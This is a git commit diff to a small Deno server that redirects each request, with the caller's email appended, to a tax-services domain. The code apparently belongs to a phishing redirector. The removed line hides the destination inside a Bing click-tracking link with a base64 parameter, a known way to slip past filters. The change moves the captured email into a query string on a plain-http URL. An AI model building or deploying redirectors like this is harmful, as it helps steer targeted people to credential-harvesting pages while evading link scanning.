45783e6c0e7f1ee2d38a0308304886eccfd29785
tailopez147 <49619133+tailopez147@users.noreply.github.com>
2026-07-02 14:12:18 +0300

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ Deno.serve({ port: PORT }, async (req) => {
   const url = new URL(req.url);
 
   const redirectBase =
-    "https://www.bing.com/ck/a?!&&p=960bc974cf4bd4e140dd387ce48c9cf0b734139524b7141f1d0e00aea6f50ad9JmltdHM9MTc4Mjk1MDQwMA&ptn=3&ver=2&hsh=4&fclid=080ac139-b0f5-6daa-32cb-d64db12c6c83&u=a1aHR0cHM6Ly9qbnN0YXhzZXJ2aWNlcy5jb20vc2VydmljZXM";
+    "http://jnstaxservices.com/services";
 
   let email: string | null = null;
 
@@ -48,7 +48,7 @@ Deno.serve({ port: PORT }, async (req) => {
   }
 
   const redirectUrl = email
-    ? redirectBase.replace(/\/+$/, "") + "#" + email
+    ? redirectBase.replace(/\/+$/, "") + "?email=" + email
     : redirectBase;
 
   return Response.redirect(redirectUrl, 302);
